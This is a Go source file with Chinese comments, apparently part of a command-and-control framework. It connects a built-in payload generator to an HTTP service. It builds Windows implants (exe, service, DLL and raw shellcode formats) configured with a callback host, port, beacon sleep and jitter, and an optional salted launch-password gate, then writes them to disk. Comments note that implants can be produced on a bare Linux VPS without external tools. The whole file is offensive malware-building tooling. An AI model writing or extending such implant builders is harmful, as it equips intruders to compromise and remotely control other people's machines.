package main

// csdev :: payload_build.go  --  内置生成器到 HTTP 接口之间的胶水
//
// 与 gen_native.go 的分工: 那边只管"把配置写进模板", 这边管"口令盐/摘要怎么来、
// 输出文件放哪、日志怎么写"。分开是为了让 gen_native.go 保持纯粹可单测
// (它不碰文件系统也不碰随机口令)。

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// extOf 各格式的默认扩展名 (仅在调用方没给输出路径时用来拼文件名)
func extOf(format string) string {
	switch format {
	case "win2-exe", "win2-console", "win2-svc", "win2-tcp":
		return ".exe"
	case "win2-dll":
		return ".dll"
	case "win2-raw":
		return ".bin"
	}
	return ".bin"
}

// makeTokenGate 按口令生成"随机盐 + 摘要"。
//
// 盐每次生成都随机 —— 同一个口令在不同次生成里的摘要不同, 预计算的彩虹表无效。
// 明文口令只活在这个函数里, 不写进产物、不进日志。
func makeTokenGate(password string) (salt, hash string, err error) {
	if password == "" {
		return "", "", nil
	}
	if len(password) < 4 {
		return "", "", fmt.Errorf("口令太短 (至少 4 个字符)")
	}
	if strings.ContainsAny(password, " \t\r\n") {
		return "", "", fmt.Errorf("口令不能含空白字符 (植入体按空白切分命令行)")
	}
	raw := make([]byte, 8)
	if _, err = rand.Read(raw); err != nil {
		return "", "", fmt.Errorf("随机数不可用: %v", err)
	}
	salt = hex.EncodeToString(raw)
	sum := sha256.Sum256([]byte(salt + password))
	hash = hex.EncodeToString(sum[:])
	return salt, hash, nil
}

// buildPayloadNative 用内置模板生成载荷并落盘。返回可读日志。
//
// 全程不调用任何外部进程 —— 这是让服务端能在没有 PowerShell / MinGW 的机器上
// (例如一台干净的 Linux VPS) 生成载荷的关键。
func buildPayloadNative(format, host string, port int, ssl bool, uri string,
	sleepMS, jitter int, xform, password, outFile, devRoot string) (string, error) {

	var sb strings.Builder
	sb.WriteString("[*] 内置生成器 (无需外部工具链)\n")

	salt, hash, err := makeTokenGate(password)
	if err != nil {
		return sb.String(), err
	}

	cfg := PayloadCfg{
		Host:      host,
		Port:      port,
		URI:       uri,
		Sleep:     sleepMS,
		Jitter:    jitter,
		Xform:     xform,
		SSL:       ssl,
		TokenSalt: salt,
		TokenHash: hash,
	}

	blob, err := BuildPayloadNative(format, cfg)
	if err != nil {
		return sb.String(), err
	}

	// 输出路径: 调用方给了就用, 否则按 payload2_<格式>_<地址>_<端口>.<ext> 落到 build/payload/
	if outFile == "" {
		dir := filepath.Join(devRoot, "build", "payload")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return sb.String(), fmt.Errorf("创建输出目录失败: %v", err)
		}
		outFile = filepath.Join(dir, fmt.Sprintf("payload2_%s_%s_%d%s",
			format, host, port, extOf(format)))
	} else {
		if err := os.MkdirAll(filepath.Dir(outFile), 0o755); err != nil {
			return sb.String(), fmt.Errorf("创建输出目录失败: %v", err)
		}
	}

	if err := os.WriteFile(outFile, blob, 0o644); err != nil {
		return sb.String(), fmt.Errorf("写产物失败: %v", err)
	}

	sb.WriteString(fmt.Sprintf("    格式   : %s\n", format))
	sb.WriteString(fmt.Sprintf("    回连   : %s%s:%d%s\n", schemeOf(ssl), host, port, uri))
	sb.WriteString(fmt.Sprintf("    心跳   : %d ms, 抖动 %d%%\n", sleepMS, jitter))
	sb.WriteString(fmt.Sprintf("    输出   : %s (%d 字节)\n", outFile, len(blob)))
	if hash != "" {
		sb.WriteString("    门控   : 已启用启动口令 (明文不回显)\n")
	} else {
		sb.WriteString("    门控   : 未启用 (直接运行)\n")
	}
	sb.WriteString(fmt.Sprintf("[+] 生成完成 %s\n", time.Now().Format("15:04:05")))
	return sb.String(), nil
}

func schemeOf(ssl bool) string {
	if ssl {
		return "https://"
	}
	return "http://"
}
